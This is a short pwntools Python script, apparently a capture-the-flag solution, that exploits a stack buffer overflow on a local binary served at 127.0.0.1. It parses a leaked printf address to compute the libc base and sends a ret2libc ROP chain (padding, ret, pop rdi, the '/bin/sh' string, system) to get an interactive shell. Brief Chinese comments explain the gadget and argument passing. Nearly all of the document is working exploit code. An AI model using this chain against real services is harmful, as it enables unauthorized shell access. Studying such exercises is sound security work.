# pop rdi 的用法 system 的参数要求 x86架构传参
from pwn import *

context(arch='amd64',os='linux',log_level='debug',endian='little')

# p = process('./pwn')
p = remote('127.0.0.1',61234)
libc = ELF('./libc.so.6')

p.recvuntil(b'printf\': ')
ppp = p.recvuntil(b'\n')
p.recvuntil(b':\n> ')

# bytes转十六进制
printf = int(ppp[:-1],16)

# 计算基地址
libc_base = printf - libc.symbols['printf']
# 计算需要的地址
system = libc.symbols['system'] + libc_base
ret = 0x401232
pop_rdi_addr = 0x2a3e5 + libc_base
binsh_addr = 0x1D8678 + libc_base

payload = b'a'*64+b'b'*8+p64(ret)+p64(pop_rdi_addr)+p64(binsh_addr)+p64(system)
p.send(payload)

p.interactive()